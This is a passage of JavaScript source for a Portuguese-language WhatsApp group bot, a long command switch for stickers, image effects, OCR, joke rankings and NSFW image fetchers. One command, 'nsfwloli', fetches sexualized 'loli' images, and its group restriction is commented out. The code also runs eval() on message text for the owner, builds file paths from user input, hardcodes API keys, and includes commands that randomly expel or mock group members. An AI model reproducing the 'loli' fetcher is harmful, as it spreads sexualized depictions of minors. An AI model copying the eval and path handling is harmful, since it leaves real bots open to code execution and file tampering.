	anu = await imgbb("1de306ef89f417cd19c4dcb29b312e75", owgi)
	hehe = await getBuffer(`https://docs-jojo.herokuapp.com/api/remove-bg?url=${anu.display_url}`)
	 edward.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	reply('Marque uma foto!!')
	}
	 break

case 'farma':
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
reply(mess.wait)
owgi = await edward.downloadAndSaveMediaMessage(ger)
anu = await imgbb("f2d03a801441d9021abfe0fa5e46385e", owgi)
imgtrg = `${anu.display_url}`
anu1 = `https://api-exteam.herokuapp.com/api/gun?img=${imgtrg}}`
sendStickerUrl(from, `${anu1}`).catch(() => reply('Deu erro 😢'))
} else {
reply('Você precisa marcar ou enviar uma imagem para isso')}
break
case 'circle':
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
reply(mess.wait)
owgi = await edward.downloadAndSaveMediaMessage(ger)
anu = await imgbb("f2d03a801441d9021abfe0fa5e46385e", owgi)
imgtrg = `${anu.display_url}`
anu1 = `https://api-exteam.herokuapp.com/api/circle?img=${imgtrg}`
sendStickerUrl(from, `${anu1}`).catch(() => reply('Deu erro 😢'))
} else {
reply('Você precisa marcar ou enviar uma imagem para isso')}
break

case 'fcomunista':
case 'skomunis':
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
reply(mess.wait)
owgi = await edward.downloadAndSaveMediaMessage(ger)
anu = await imgbb("f2d03a801441d9021abfe0fa5e46385e", owgi)
imgtrg = `${anu.display_url}`
anu1 = `https://api-exteam.herokuapp.com/api/comunismo?img=${imgtrg}`
sendStickerUrl(from, `${anu1}`).catch(() => reply('Deu erro 😢'))
} else {
reply('Você precisa marcar ou enviar uma imagem para isso')}
break


			case 'speed':
			case 'velocidade':
			case 'ping':
					const timestampi = speed();
					const latensyi = speed() - timestampi
					reply(`Velocidade: ${latensyi.toFixed(4)} Segundos 🏓`)
					break
				case 'return':
				if (!isOwner) return reply(mess.only.ownerB)
					return edward.sendMessage(from, JSON.stringify(eval(body.slice(8))), text, {quoted: mek})
					if (err) return edward.sendMessage(from, `root @Bruno-sayo:~ ${err}`, text, { quoted: mek })
                 break
                 case 'toimg':
				case 'tomedia':
					if (!isQuotedSticker) return reply('Marque a figurinha')
					if (mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated === true){
						const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						const media = await edward.downloadAndSaveMediaMessage(encmedia)
						const upload = await uploadimg(media, Date.now() + '.webp')
						console.log(upload)
						reply(`${upload.result.image}`)
						const rume = await axios.get(`http://nzcha-apii.herokuapp.com/webp-to-mp4?url=${upload.result.image}`)
						console.log(rume.data)
						sendMediaURL(from, rume.data.result)
					} else {
						const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						const media = await edward.downloadAndSaveMediaMessage(encmedia)
						ran = '1000.png'
						exec(`ffmpeg -i ${media} ${ran}`, (err) => {
							fs.unlinkSync(media)
							if (err) return reply(mess.error.api)
							buffer = fs.readFileSync(ran)
							edward.sendMessage(from, buffer, image, {quoted: mek})
							fs.unlinkSync(ran)
						})
					}
					break
					case 'tovideo': case 'tovid':
if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
reply(mess.wait)
encmediaaa = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
mediaaa = await edward.downloadAndSaveMediaMessage(encmediaaa)
a = await webp2gifFile(mediaaa)
mp4 = await getBuffer(a.result)
edward.sendMessage(from, mp4, video, {mimetype: 'video/mp4', quoted: finv, caption: mess.success})
fs.unlinkSync(mediaaa)
} else {
reply(mess.error.api)
}
break
case'gpbot':
  edward.sendMessage(from, `Ficarei feliz em receber você em meu grupo 🤠`, text,{ quoted: m, thumbnail: verificado, contextInfo: { externalAdReply:{title: `${educabot}` ,body:"Obrigado por me usar :)",previewType:"PHOTO",thumbnail:fs.readFileSync('./arquivos/img/verificado.jpg'),sourceUrl:`https://chat.whatsapp.com/D83tJcsjAhv925WJkEHLwW`}}})
break
				case 'ss':
					sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/ssweb?url=${args[0]}&apikey=${HunterApi}`)
					break
case 'ocr':
case 'ler':
if (isMedia && !mek.message.videoMessage || isQuotedImage) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
const media = await edward.downloadAndSaveMediaMessage(encmedia)                   
reply(mess.wait)
await lerimg(media, {lang: 'eng+pt', oem: 1, psm: 3})
.then(teks => {
reply(teks.trim())
fs.unlinkSync(media)
	})
		.catch(err => {
		reply(err(prefix))
fs.unlinkSync(media)
	})
	} else {
	reply(`📇 RECONHECIMENTO DE TEXTO\n▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁\n\n✳️ Envia uma imagem com *${prefix + command}* ou marque alguma imagem que já foi enviada\n\n▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁\n*comando*\n${prefix}ocr\n${prefix}ler`)
	}					
		break
				break
				case 'addsticker':
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					if (!isQuotedSticker) return reply('Marque a figurinha')
					nm = body.slice(12)
					if (!nm) return reply('Qual é o nome do adesivo??')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await edward.downloadMediaMessage(boij)
					setik.push(`${nm}`)
					fs.writeFileSync(`./arquivos/arquivos_mídia/sticker/${nm}.webp`, delb)
					fs.writeFileSync('./db/setik.json', JSON.stringify(setik))
					edward.sendMessage(from, `Figurinha guardada, por favor verifique usando *${prefix}liststicker*`, MessageType.text, { quoted: mek })
					break
				case 'delsticker':
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					try {
					 nmm = body.slice(12)
					 wanu = setik.indexOf(nmm)
					 setik.splice(wanu, 1)
					 fs.unlinkSync(`./arquivos/arquivos_mídia/sticker/${nmm}.webp`)
					 reply(`Sucesso ao apagar a figurinha: ${body.slice(12)}`)
					} catch (err){
						console.log(err)
						reply(mess.error.api)
					}
					break
				case 'stickerlist':
				case 'liststicker':
				case 'figulista':
					teks = '*Lista de figurinhas :*\n\n'
					for (let awokwkwk of setik) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${setik.length}*\n\n_Para tirar a figurinha, responda a esta mensagem com a legenda do nome da figurinha_`
					edward.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": setik } })
					break
					case 'addvn':
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					if (!isQuotedAudio) return reply('Marque o áudio')
					nm = body.slice(7)
					if (!nm) return reply('Dê um nome para o áudio?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await edward.downloadMediaMessage(boij)
					vien.push(`${nm}`)
					fs.writeFileSync(`./arquivos/arquivos_mídia/vn/${nm}.mp3`, delb)
					fs.writeFileSync('./db/vien.json', JSON.stringify(vien))
					edward.sendMessage(from, `Áudio guardado, por favor verifique usando  *${prefix}listvn*`, MessageType.text, { quoted: mek })
					break
					case 'delvn':
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					try {
					 nmm = body.slice(7)
					 wanu = vien.indexOf(nmm)
					 vien.splice(wanu, 1)
					 fs.unlinkSync(`./arquivos/arquivos_mídia/vn/${nmm}.mp3`)
					reply(`Áudio excluido com sucesso: ${body.slice(7)}`)
					} catch (err){
						console.log(err)
						reply(mess.error.api)
					}
					break
				case 'vnlist':
				case 'listvn':
					teks = '*Lista dos áudios :*\n\n'
					for (let awokwkwk of vien) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${vien.length}*\n\n_Para tirar o áudio, responda a esta mensagem com a legenda do nome do áudio_`
					edward.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": vien } })
					break
				case 'addimage':
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					if (!isQuotedImage) return reply('Marque alguma imagem')
					nm = body.slice(10)
					if (!nm) return reply('Dê um nome para essa imagem...')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await edward.downloadMediaMessage(boij)
					imagi.push(`${nm}`)
					fs.writeFileSync(`./arquivos/arquivos_mídia/image/${nm}.jpg`, delb)
					fs.writeFileSync('./db/imagi.json', JSON.stringify(imagi))
					edward.sendMessage(from, `Imagem guardada, por favor verifique usando *${prefix}listimage*`, MessageType.text, { quoted: mek })
					break
				case 'delimage':
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					try {
					 nmm = body.slice(10)
					 wanu = imagi.indexOf(nmm)
					 imagi.splice(wanu, 1)
					 fs.unlinkSync(`./arquivos/arquivos_mídia/image/${nmm}.jpg`)
					 reply(`Imagem excluida com sucesso: ${body.slice(10)}`)
					} catch (err){
						console.log(err)
						reply(mess.error.api)
					}
					break
					case 'imagelist':
				case 'listimage':
					teks = '*lista de imagens :*\n\n'
					for (let awokwkwk of imagi) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${imagi.length}*\n\n_Para tirar a imagem, responda a esta mensagem com a legenda do nome da imagem_`
					edward.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": imagi } })
					break
				case 'sticktag':
				case 'figutag':
				if (!isGroup) return reply(mess.only.group)
				anu  = body.slice(10)
				wanu = anu.split('|')
				var group = await edward.groupMetadata(wanu[0])
				var member = group['participants']
				var mem = []
				member.map( async adm => {
				mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
				})
				result = fs.readFileSync(`./arquivos/arquivos_mídia/sticker/${wanu[1]}.webp`)
				edward.sendMessage(`${wanu[0]}`, result, sticker, { contextInfo: { "mentionedJid": mem }})
				break
			case 'runtime':
				runtime = process.uptime()
				reply(`Tempo que estou ativada : ${waktu(runtime)}`)
				break
			case 'setbio':
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				if (args.length < 1) return reply('Cadê o nome?')
					iyek = body.slice(8)
					edward.setStatus(`${iyek}`)
					reply(`Sucesso ao mudar a biografia para: ${body.slice(8)}`)
					break
					case 'setname':
					case 'setnome':
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				if (args.length < 1) return reply('Cadê o nome?')
                anu = body.slice(9)
                edward.updateProfileName(anu)
                reply(`Sucesso ao mudar o nome para: ${body.slice(9)}`)
                break
/*			case 'add':
			if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return reply(mess.only.admin)
			if (!isBotGroupAdmins) return reply(mess.only.Badmin)
			if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Marque a msg da pessoa!')
			add = mek.message.extendedTextMessage.contextInfo.participant
		    edward.groupAdd(from, [add])
				reply('Membro adicionado com sucesso')
				break*/
   case 'kick':
if (!isOwner && !isGroupAdmins) return reply('Ta se achando o adm fdp?')
if (!isBotGroupAdmins) return reply('Da adm desgraça')
if (!isGroup) return
if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) return;
if (mek.message.extendedTextMessage.contextInfo.participant === undefined) {
entah = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (entah.length > 1) {
var mems_ids = []
for (let ids of entah) {
mems_ids.push(ids)
}
edward.groupRemove(from, mems_ids)
} else {
edward.groupRemove(from, [entah[0]])
}
} else {
entah = mek.message.extendedTextMessage.contextInfo.participant
edward.groupRemove(from, [entah])
}
break
   case 'creategroup':
			case 'creategrup':
			case 'criargp':
			if (!isGroup) return reply(mess.only.group)
				if (args.length < 1) return reply(`Use assim: ${prefix + command} nome gp|@tag membro`)
				argz = arg.split('|')
				if (mek.message.extendedTextMessage != undefined){
                    mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
                    for (let i = 0; i < mentioned.length; i++){
						anu = []
						anu.push(mentioned[i])
                    }
					edward.groupCreate(argz[0], anu)
					reply(`Grupo criado com sucesso\n ${argz[0]}`)
                }
				break
			case 'addrespon':
			if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				if (args.length < 1) return reply(`Use assim ${prefix + command} olá|olá ${pushname}`)
				argz = arg.split('|')
				if (checkCommands(argz[0], commandsDB) === true) return reply(`Já tem essa resposta`)
				addCommands(argz[0], argz[1], sender, commandsDB)
				reply(`Sucesso ao adicionar a resposta: ${argz[0]}`)
				break
			case 'delrespon':
			if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				if (args.length < 1) return reply(`Use assim ${prefix + command} oii`)
				if (!checkCommands(body.slice(11), commandsDB)) return reply(`Esta resposta não esta na lista`)
                deleteCommands(body.slice(11), commandsDB)
				reply(`Resposta deletada com sucesso:\n ${body.slice(11)}`)
				break
				case 'listrespon':
teks = `\`\`\`「 LISTA DE RESPOSTAS  」\`\`\`\n\n`
for (let i = 0; i < commandsDB.length; i ++){
teks += `❏ *Pergunta:* ${commandsDB[i].pesan}\n`
teks += `❏ *Resposta:* ${commandsDB[i].balasan}\n`
teks += `❏ *Criador:* ${commandsDB[i].creator}\n\n`
}
reply(teks)
break
case 'metadinha':
reply(`Estou fazendo 🤠`)
anu = await fetchJson(`https://akame-api.herokuapp.com/api/anime/metadinha?apikey=edwardbot22`)
buffer = await getBuffer(anu.resultado.metadinha_feminina)
buffer2 = await getBuffer(anu.resultado.metadinha_masculina)
edward.sendMessage(from, buffer, image, {caption: `Feminina`, quoted: mek, thumbnail: null})
edward.sendMessage(from, buffer2, image, {caption: `Masculina`, quoted: mek, thumbnail: null})
break
//HENTAI===> LIMIT
case 'nsfwloli':

//if (m.isGroup) return reply(`Você so poder usar esse cmd no pv 😏`)
reply(mess.wait)
hentai = await getBuffer(`https://akame-api.herokuapp.com/api/hentai/nsfwloli?apikey=edwardbot22`)
sendButImage(from, `${command}`,`@breno`,hentai,[{buttonId: `${command}`, buttonText: {displayText: '🌀PRÓXIMA ♻️'}, type: 1}], {quoted:mek})
break
case 'nsfwneko':

if (m.isGroup) return reply(`Você so poder usar esse cmd no pv 😏`)
hentai = await getBuffer(`https://akame-api.herokuapp.com/api/hentai/nsfwNeko?apikey=edwardbot22`)
sendButImage(from, `${command}`,`@breno`,hentai,[{buttonId: 'nsfwneko', buttonText: {displayText: '🌀PRÓXIMA ♻️'}, type: 1}], {quoted:mek,thumbnail:img,contextInfo: { forwardingScore: 508, isForwarded: true}})

break
case 'ahegao':

if (m.isGroup) return reply(`Você so poder usar esse cmd no pv 😏`)
hentai = await getBuffer(`https://akame-api.herokuapp.com/api/hentai/ahegao?apikey=edwardbot22`,`${command}`)
sendButImage(from, `${command}`,`@breno`,hentai,[{buttonId: `${command}`, buttonText: {displayText: '🌀PRÓXIMA ♻️'}, type: 1}], {quoted:mek})

break
case 'ass':

if (m.isGroup) return reply(`Você so poder usar esse cmd no pv 😏`)
hentai = await getBuffer(`https://akame-api.herokuapp.com/api/hentai/ass?apikey=edwardbot22`,`${command}`)
sendButImage(from, `${command}`,`@breno`,hentai,[{buttonId: `${command}`, buttonText: {displayText: '🌀PRÓXIMA ♻️'}, type: 1}], {quoted:mek})

break
case 'bdsm':

if (m.isGroup) return reply(`Você so poder usar esse cmd no pv 😏`)
hentai = await getBuffer(`https://akame-api.herokuapp.com/api/hentai/bdsm?apikey=edwardbot22`,`${command}`)
sendButImage(from, `${command}`,`@breno`,hentai,[{buttonId: `${command}`, buttonText: {displayText: '🌀PRÓXIMA ♻️'}, type: 1}], {quoted:mek})

break
case 'blowjob':

if (m.isGroup) return reply(`Você so poder usar esse cmd no pv 😏`)
hentai = await getBuffer(`https://akame-api.herokuapp.com/api/hentai/blowjob?apikey=edwardbot22`,`${command}`)
sendButImage(from, `${command}`,`@breno`,hentai,[{buttonId: `${command}`, buttonText: {displayText: '🌀PRÓXIMA ♻️'}, type: 1}], {quoted:mek})

break
case 'cuckold':

if (m.isGroup) return reply(`Você so poder usar esse cmd no pv 😏`)
hentai = await getBuffer(`https://akame-api.herokuapp.com/api/hentai/cuckold?apikey=edwardbot22`,`${command}`)
sendButImage(from, `${command}`,`@breno`,hentai,[{buttonId: `${command}`, buttonText: {displayText: '🌀PRÓXIMA ♻️'}, type: 1}], {quoted:mek})

break
case 'cum':

if (m.isGroup) return reply(`Você so poder usar esse cmd no pv 😏`)
hentai = await getBuffer(`https://akame-api.herokuapp.com/api/hentai/cum?apikey=edwardbot22`,`${command}`)
sendButImage(from, `${command}`,`@breno`,hentai,[{buttonId: `${command}`, buttonText: {displayText: '🌀PRÓXIMA ♻️'}, type: 1}], {quoted:mek})

break
case 'ero':

if (m.isGroup) return reply(`Você so poder usar esse cmd no pv 😏`)
hentai = await getBuffer(`https://akame-api.herokuapp.com/api/hentai/ero?apikey=edwardbot22`,`${command}`)
sendButImage(from, `${command}`,`@breno`,hentai,[{buttonId: `${command}`, buttonText: {displayText: '🌀PRÓXIMA ♻️'}, type: 1}], {quoted:mek})

break
case 'femdom':

if (m.isGroup) return reply(`Você so poder usar esse cmd no pv 😏`)
hentai = await getBuffer(`https://akame-api.herokuapp.com/api/hentai/femdom?apikey=edwardbot22`,`${command}`)
sendButImage(from, `${command}`,`@breno`,hentai,[{buttonId: `${command}`, buttonText: {displayText: '🌀PRÓXIMA ♻️'}, type: 1}], {quoted:mek})

break
case 'foot':

if (m.isGroup) return reply(`Você so poder usar esse cmd no pv 😏`)
hentai = await getBuffer(`https://akame-api.herokuapp.com/api/hentai/foot?apikey=edwardbot22`,`${command}`)
sendButImage(from, `${command}`,`@breno`,hentai,[{buttonId: `${command}`, buttonText: {displayText: '🌀PRÓXIMA ♻️'}, type: 1}], {quoted:mek})

break
case 'gangbang':

if (m.isGroup) return reply(`Você so poder usar esse cmd no pv 😏`)
hentai = await getBuffer(`https://akame-api.herokuapp.com/api/hentai/gangbang?apikey=edwardbot22`,`${command}`)
sendButImage(from, `${command}`,`@breno`,hentai,[{buttonId: `${command}`, buttonText: {displayText: '🌀PRÓXIMA ♻️'}, type: 1}], {quoted:mek})

break
case 'glasses':

if (m.isGroup) return reply(`Você so poder usar esse cmd no pv 😏`)
hentai = await getBuffer(`https://akame-api.herokuapp.com/api/hentai/glasses?apikey=edwardbot22`,`${command}`)
sendButImage(from, `${command}`,`@breno`,hentai,[{buttonId: `${command}`, buttonText: {displayText: '🌀PRÓXIMA ♻️'}, type: 1}], {quoted:mek})

break
case 'hentai':

if (m.isGroup) return reply(`Você so poder usar esse cmd no pv 😏`)
hentai = await getBuffer(`https://akame-api.herokuapp.com/api/hentai/hentai?apikey=edwardbot22`,`${command}`)
sendButImage(from, `${command}`,`@breno`,hentai,[{buttonId: `${command}`, buttonText: {displayText: '🌀PRÓXIMA ♻️'}, type: 1}], {quoted:mek})

break
case 'jahy':

if (m.isGroup) return reply(`Você so poder usar esse cmd no pv 😏`)
hentai = await getBuffer(`https://akame-api.herokuapp.com/api/hentai/jahy?apikey=edwardbot22`,`${command}`)
sendButImage(from, `${command}`,`@breno`,hentai,[{buttonId: `${command}`, buttonText: {displayText: '🌀PRÓXIMA ♻️'}, type: 1}], {quoted:mek})

break
case 'wallpaper18':

if (m.isGroup) return reply(`Você so poder usar esse cmd no pv 😏`)
hentai = await getBuffer(`http://hadi-api.herokuapp.com/api/anime`,`${command}`)
sendButImage(from, `${command}`,`@bruno`,hentai,[{buttonId: `${command}`, buttonText: {displayText: '🌀PRÓXIMA ♻️'}, type: 1}], {quoted:mek})

break
case 'masturbation':

if (m.isGroup) return reply(`Você so poder usar esse cmd no pv 😏`)
hentai = await getBuffer(`https://akame-api.herokuapp.com/api/hentai/masturbation?apikey=edwardbot22`,`${command}`)
sendButImage(from, `${command}`,`@breno`,hentai,[{buttonId: `${command}`, buttonText: {displayText: '🌀PRÓXIMA ♻️'}, type: 1}], {quoted:mek})

break
case 'roletarussa':
                if (!isBotGroupAdmins) return reply(mess.badmin)	  

                if (!isGroupAdmins) return reply(mess.admin) 
                reply('Que os jogos comecem 😈') 
 figra = ["roleta1","roleta2","roleta3"]
tpb = figra[Math.floor(Math.random() * (figra.length))]
figb = fs.readFileSync('./arquivos/'+tpb+'.webp')
membr = []
const metti = groupMembers
const msddd = groupMembers
const siapssaa = metti[Math.floor(Math.random() * metti.length)]
 teste = `*TINHA UMA BALA NO TAMBOR E @${siapssaa.jid.split('@')[0]} FOI ELIMINADO 😡🔪*`
 membr.push(siapssaa.jid)
mentions(teste, membr, true) 
setTimeout( () => {
		        edward.groupRemove(from, membr)
		        }, 1000)
		       setTimeout( () => {
			    edward.updatePresence(from, Presence.composing)
      edward.sendMessage(from, figb, sticker, {quoted: mek})
		        }, 0)
	          
	            break
case 'par':
par = []
 par2 = groupMembers
par3 = groupMembers
par4 = par2[Math.floor(Math.random() * par2.length)]
 par5 = pushname[Math.floor(Math.random() * par3.length)]
bbebn = `Segundo meus cálculos, o par perfeito para ${pushname} é : @${par4.jid.split('@')[0]} 🙈`
par.push(par4.jid)
mentions(bbebn, par, true) 
break
    
case 'casal':
 jds = []
const jdii = groupMembers
const koss = groupMembers
const akuu = jdii[Math.floor(Math.random() * jdii.length)]
const diaa = koss[Math.floor(Math.random() * koss.length)]
teks = `Meus cálculos dizem que @${akuu.jid.split('@')[0]} e @${diaa.jid.split('@')[0]} possuem grande chance de namorar, apenas aceitem o destino...`
jds.push(akuu.jid)
jds.push(diaa.jid)
mentions(teks, jds, true)
break	

//mini games, rate, random


case 'caracoroa':
  
  if (args.length < 1) return reply('exemplo:\n*caracoroa cara\n*caracoroa coroa')
  const cara = fs.readFileSync('./database/cara/cara.webp');
  const coroa = fs.readFileSync('./database/cara/coroa.webp');
  cararo = ["cara", "coroa"]
  fej = cararo[Math.floor(Math.random() * cararo.length)]
  gg = fej
  cararoa = fs.readFileSync('./database/cara/'+fej+'.webp')
  xp = Math.floor(Math.random() * 13) + 3
  xp1 = `Você ganhou ${xp} em xp`
  if ((fej == "cara" && args == "cara") || 
  (fej == "coroa" && args == "coroa")) {
  var vit = "vitoria"
  } else if ((fej == "coroa" && args == "cara") || 
  (fej == "cara" && args == "coroa")) {
  var vit = "derrota"
  }
  if (vit == "vitoria") {
  var tes = "Vitória do jogador"
  }
  if (vit == "derrota" ) {
  var tes = "A vitória é do Capitão edward  😎"
  }
  reply(`Escolha do jogador:   ${args}\nResultado:  ${fej}\n\n${tes}`)
  if (tes == "Vitória do jogador") {
  reply(xp1)
  }
  edward.sendMessage(from, cararoa, sticker, {quoted: mek})
  break
 
case 'morte':
case 'death':
idde = ["30","76","90","72","83","73","83","74","92","100","94","48","37","53","63"]
idade = idde[Math.floor(Math.random() * (idde.length))]
morte = `Pessoas com este nome: ${pushname} \nTendem a morrer aos ${idade} anos de idade.`
reply(morte)
break

case 'sn':
const sn = ['sim', 'não']
gosto = body.slice(3)
if (args.length < 1) return edward.sendMessage(from, `Você deve fazer uma pergunta...\nExemplo: ${prefix}sn O Brun é um preguiçoso?`, text, {quoted: mek})
const jawab = sn[Math.floor(Math.random() * (sn.length))]
hasil = `${gosto}\n\nSegundo meus cálculos, eu acredito que... ${jawab}`
reply(hasil)
break
 
case 'gadometro':
case 'gado':
var chifre = ["ultra extreme gado", "Gado-Master", "Gado-Rei", "Gado", "Escravo-ceta", "Escravo-ceta Maximo", "Gacorno?", "Jogador De Forno Livre<3", "Mestre Do Frifai<3<3", "Gado-Manso", "Gado-Conformado", "Gado-Incubado", "Gado Deus", "Mestre dos Gados", "Topa tudo por buceta", "Gado Comum", "Mini Gadinho", "Gado Iniciante", "Gado Basico", "Gado Intermediario", "Gado Avançado", "Gado Profisional", "Gado Mestre", "Gado Chifrudo", "Corno Conformado", "Corno HiperChifrudo", "Chifrudo Deus", "Mestre dos Chifrudos"]
var gado = chifre[Math.floor(Math.random() * chifre.length)]
wew = fs.readFileSync(`./arquivos/gado.jpg`)
gadop = `${Math.floor(Math.random() * 100)}`
teks = `Você é:\n\n${gado}`
edward.sendMessage(from, wew, image, {quoted: mek, caption: teks})
break
case 'topgay':
try{
if(!isGroup) return reply(mess.group)
d = []
top1 = body.slice(5)
teks = `🏳️‍🌈𝖗𝖆𝖓𝖐 𝖉𝖔𝖘 𝖒𝖆𝖎𝖘 𝖌𝖆𝖞🏳️‍🌈\n`
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `❧ @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true, {quoted: mek})
} catch (e) {
console.log(e)
reply('ocorreu um erro')
}
break
case 'gostosas':
try{
if(!isGroup) return reply(mess.group)
d = []
top1 = body.slice(5)
teks = `𝐀𝐒 𝐌𝐀𝐈𝐒 𝐆𝐎𝐒𝐓𝐎𝐒𝐀𝐒𝐊𝐊𝐊\n`
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `❧ @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true, {quoted: mek})
} catch (e) {
console.log(e)
reply('ocorreu um erro')
}
break
case 'rankfofo':
try{
if(!isGroup) return reply(mess.group)
d = []
top1 = body.slice(5)
teks = `𝙾𝚂 𝙼𝙰𝙸𝚂 𝙵𝙾𝙵𝙾𝚂👉👈\n`
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `❧😳 @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true, {quoted: mek})
} catch (e) {
console.log(e)
reply('ocorreu um erro')
}
break
case 'rankfeio':
try{
if(!isGroup) return reply(mess.group)
d = []
top1 = body.slice(5)
teks = `👹 𝚁𝚊𝚗𝚔 𝚍𝚘𝚜 𝚖𝚊𝚒𝚜 𝚏𝚎𝚒𝚘𝚜𝙺𝙺𝙺𝙺𝙺𝙺\n`
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `👹❧ @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true, {quoted: mek})
} catch (e) {
console.log(e)
reply('ocorreu um erro')
}
break
case 'topgado':
try{
if(!isGroup) return reply(mess.group)
d = []
top1 = body.slice(5)
teks = `𝙾𝚂 𝙼𝙰𝙸𝚂 𝙶𝙰𝙳𝙾𝚂 𝙳𝙾 𝙶𝚁𝚄𝙿𝙾\n`
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `❧ 🐂@${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true, {quoted: mek})
} catch (e) {
console.log(e)
reply('ocorreu um erro')
}
break

case 'chance':
edward.updatePresence(from, Presence.composing) 
var avb = body.slice(7)
if (args.length < 1) return edward.sendMessage(from, `Você precisa digitar da forma correta\nExemplo: ${prefix}chance do Brun ser um trouxa`, text, {quoted: mek})
random = `${Math.floor(Math.random() * 100)}`
hasil = `A chance ${body.slice(7)}\n\né de... ${random}%`
edward.sendMessage(from, hasil, text, {quoted: mek, contextInfo: {mentionedJid: [sender]}})
break

case 'rola':
case 'pau':
random = `${Math.floor(Math.random() * 35)}`
const tamanho = random
wew = fs.readFileSync(`./arquivos/pau.jpg`)
//var (isNaN(tamanho))
if (tamanho < 13 ) {pp = 'só a fimose'} else if (tamanho == 13 ) {pp = 'passou da média😳'} else if (tamanho == 14 ) {pp = 'passou da média😳'} else if (tamanho == 15 ) {pp = 'eita, vai pegar manga?'} else if (tamanho == 16 ) {pp = 'eita, vai pegar manga?'} else if (tamanho == 17 ) {pp = 'calma man, a mina não é um poço😳'} else if (tamanho == 18 ) {pp = 'calma man, a mina não é um poço😳'} else if (tamanho == 19 ) {pp = 'calma man, a mina não é um poço😳'} else if (tamanho == 20 ) {pp = 'você tem um poste no meio das pernas'} else if (tamanho == 21 ) {pp = 'você tem um poste no meio das pernas'} else if (tamanho == 22 ) {pp = 'você tem um poste no meio das pernas'} else if (tamanho == 23 ) {pp = 'você tem um poste no meio das pernas'} else if (tamanho == 24 ) {pp = 'você tem um poste no meio das pernas'} else if (tamanho > 25 ) {pp = 'vai procurar petróleo com isso?'
}
teks = `Seu pau tem ${random}cm\n\n${pp}`
edward.sendMessage(from, wew, image, {quoted: mek, caption: teks})
break
///////anime///////
case 'eren':
anu = await fetchJson(`https://akame-api.herokuapp.com/api/pinterest?nome=Eren%20Yegger&apikey=edwardbot22`)
res = anu.resultado
random =  res[Math.floor(Math.random() * res.length)]
pinter = await getBuffer(random)
//edward.sendMessage(from, await getBuffer(random), image, {quoted: mek})
sendButImage(from, `Aqui está :)`,`@bruno`, pinter,[{buttonId: `${command}`, buttonText: {displayText: '🌀PRÓXIMA ♻️'}, type: 1}], {quoted:mek})
break
case 'naruto':
anu = await fetchJson(`https://akame-api.herokuapp.com/api/pinterest?nome=naruto%20icon&apikey=edwardbot22`)
